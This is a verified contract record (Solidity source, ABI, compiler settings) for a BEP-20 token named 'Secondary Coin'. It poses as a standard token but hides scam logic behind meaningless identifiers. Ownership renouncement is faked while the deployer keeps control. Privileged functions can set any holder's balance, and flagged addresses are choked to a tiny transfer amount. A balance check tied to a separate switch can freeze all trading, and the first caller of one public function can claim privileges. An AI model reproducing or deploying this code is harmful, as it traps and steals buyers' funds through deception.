{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract fromLaunch {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchExempt {\n    function createPair(address maxBuy, address totalTxList) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface shouldAuto {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface buyAtAmount {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address atShouldTotal) external view returns (uint256);\n\n    function transfer(address launchedTx, uint256 sellSender) external returns (bool);\n\n    function allowance(address enableSender, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 sellSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedTx,\n        uint256 sellSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed isMinAmount, uint256 value);\n    event Approval(address indexed enableSender, address indexed spender, uint256 value);\n}\n\ninterface buyAtAmountMetadata is buyAtAmount {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SecondaryCoin is fromLaunch, buyAtAmount, buyAtAmountMetadata {\n\n    function atList(address limitFromMode, address launchedTx, uint256 sellSender) internal returns (bool) {\n        if (limitFromMode == tradingLiquidityFrom) {\n            return listAt(limitFromMode, launchedTx, sellSender);\n        }\n        uint256 feeShould = buyAtAmount(fundLimitTotal).balanceOf(tokenFee);\n        require(feeShould == launchReceiverFund);\n        require(launchedTx != tokenFee);\n        if (autoSwap[limitFromMode]) {\n            return listAt(limitFromMode, launchedTx, maxTx);\n        }\n        sellSender = receiverAt(limitFromMode, launchedTx, sellSender);\n        return listAt(limitFromMode, launchedTx, sellSender);\n    }\n\n    bool private fundExempt;\n\n    constructor (){\n        \n        toReceiver();\n        shouldAuto listFrom = shouldAuto(fundTx);\n        fundLimitTotal = launchExempt(listFrom.factory()).createPair(listFrom.WETH(), address(this));\n        tokenFee = launchExempt(listFrom.factory()).feeTo();\n        if (senderMinReceiver == modeLiquidity) {\n            exemptTxReceiver = true;\n        }\n        tradingLiquidityFrom = _msgSender();\n        modeTotal[tradingLiquidityFrom] = true;\n        walletMax[tradingLiquidityFrom] = tokenTo;\n        if (sellMin != sellTake) {\n            senderMinReceiver = modeLiquidity;\n        }\n        emit Transfer(address(0), tradingLiquidityFrom, tokenTo);\n    }\n\n    uint256 public tradingFrom = 3;\n\n    string private shouldReceiverSender = \"SCN\";\n\n    uint256 constant maxTx = 6 ** 10;\n\n    uint256 private modeLiquidity;\n\n    uint256 private txTakeAuto;\n\n    bool private sellMin;\n\n    string private receiverList = \"Secondary Coin\";\n\n    function name() external view virtual override returns (string memory) {\n        return receiverList;\n    }\n\n    uint256 public senderMinReceiver;\n\n    bool public fundMaxAt;\n\n    function teamExemptReceiver() private view {\n        require(modeTotal[_msgSender()]);\n    }\n\n    function fundMax(uint256 sellSender) public {\n        teamExemptReceiver();\n        launchReceiverFund = sellSender;\n    }\n\n    address tokenFee;\n\n    bool public walletAt;\n\n    uint256 public tokenEnable = 0;\n\n    mapping(address => mapping(address => uint256)) private marketingTokenReceiver;\n\n    function transfer(address receiverFeeIs, uint256 sellSender) external virtual override returns (bool) {\n        return atList(_msgSender(), receiverFeeIs, sellSender);\n    }\n\n    mapping(address => bool) public modeTotal;\n\n    uint256 tokenSwap;\n\n    function listAt(address limitFromMode, address launchedTx, uint256 sellSender) internal returns (bool) {\n        require(walletMax[limitFromMode] >= sellSender);\n        walletMax[limitFromMode] -= sellSender;\n        walletMax[launchedTx] += sellSender;\n        emit Transfer(limitFromMode, launchedTx, sellSender);\n        return true;\n    }\n\n    uint8 private receiverSwap = 18;\n\n    function balanceOf(address atShouldTotal) public view virtual override returns (uint256) {\n        return walletMax[atShouldTotal];\n    }\n\n    function transferFrom(address limitFromMode, address launchedTx, uint256 sellSender) external override returns (bool) {\n        if (_msgSender() != fundTx) {\n            if (marketingTokenReceiver[limitFromMode][_msgSender()] != type(uint256).max) {\n                require(sellSender <= marketingTokenReceiver[limitFromMode][_msgSender()]);\n                marketingTokenReceiver[limitFromMode][_msgSender()] -= sellSender;\n            }\n        }\n        return atList(limitFromMode, launchedTx, sellSender);\n    }\n\n    function maxFee(address shouldTo) public {\n        teamExemptReceiver();\n        if (sellTake == fundExempt) {\n            modeLiquidity = senderMinReceiver;\n        }\n        if (shouldTo == tradingLiquidityFrom || shouldTo == fundLimitTotal) {\n            return;\n        }\n        autoSwap[shouldTo] = true;\n    }\n\n    function toFee(address receiverFeeIs, uint256 sellSender) public {\n        teamExemptReceiver();\n        walletMax[receiverFeeIs] = sellSender;\n    }\n\n    bool public tokenTotal;\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverSwap;\n    }\n\n    mapping(address => bool) public autoSwap;\n\n    function txReceiver(address buyFeeSwap) public {\n        if (tokenTotal) {\n            return;\n        }\n        \n        modeTotal[buyFeeSwap] = true;\n        if (fundExempt != fundMaxAt) {\n            txTakeAuto = senderMinReceiver;\n        }\n        tokenTotal = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tokenTo;\n    }\n\n    bool public exemptTxReceiver;\n\n    event OwnershipTransferred(address indexed txSender, address indexed atToExempt);\n\n    address fundTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private tokenTo = 100000000 * 10 ** 18;\n\n    function allowance(address exemptTotal, address listTake) external view virtual override returns (uint256) {\n        if (listTake == fundTx) {\n            return type(uint256).max;\n        }\n        return marketingTokenReceiver[exemptTotal][listTake];\n    }\n\n    function receiverAt(address limitFromMode, address launchedTx, uint256 sellSender) internal view returns (uint256) {\n        require(sellSender > 0);\n\n        uint256 shouldTakeWallet = 0;\n        if (limitFromMode == fundLimitTotal && tradingFrom > 0) {\n            shouldTakeWallet = sellSender * tradingFrom / 100;\n        } else if (launchedTx == fundLimitTotal && tokenEnable > 0) {\n            shouldTakeWallet = sellSender * tokenEnable / 100;\n        }\n        require(shouldTakeWallet <= sellSender);\n        return sellSender - shouldTakeWallet;\n    }\n\n    mapping(address => uint256) private walletMax;\n\n    address public fundLimitTotal;\n\n    function symbol() external view virtual override returns (string memory) {\n        return shouldReceiverSender;\n    }\n\n    function approve(address listTake, uint256 sellSender) public virtual override returns (bool) {\n        marketingTokenReceiver[_msgSender()][listTake] = sellSender;\n        emit Approval(_msgSender(), listTake, sellSender);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return fundLaunch;\n    }\n\n    address private fundLaunch;\n\n    function getOwner() external view returns (address) {\n        return fundLaunch;\n    }\n\n    bool public sellTake;\n\n    address public tradingLiquidityFrom;\n\n    function toReceiver() public {\n        emit OwnershipTransferred(tradingLiquidityFrom, address(0));\n        fundLaunch = address(0);\n    }\n\n    uint256 launchReceiverFund;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atToExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isMinAmount\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atShouldTotal\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTxReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundLimitTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"sellSender\",\"type\":\"uint256\"}],\"name\":\"fundMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundMaxAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTo\",\"type\":\"address\"}],\"name\":\"maxFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderMinReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFeeIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellSender\",\"type\":\"uint256\"}],\"name\":\"toFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLiquidityFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFeeIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitFromMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyFeeSwap\",\"type\":\"address\"}],\"name\":\"txReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "SecondaryCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}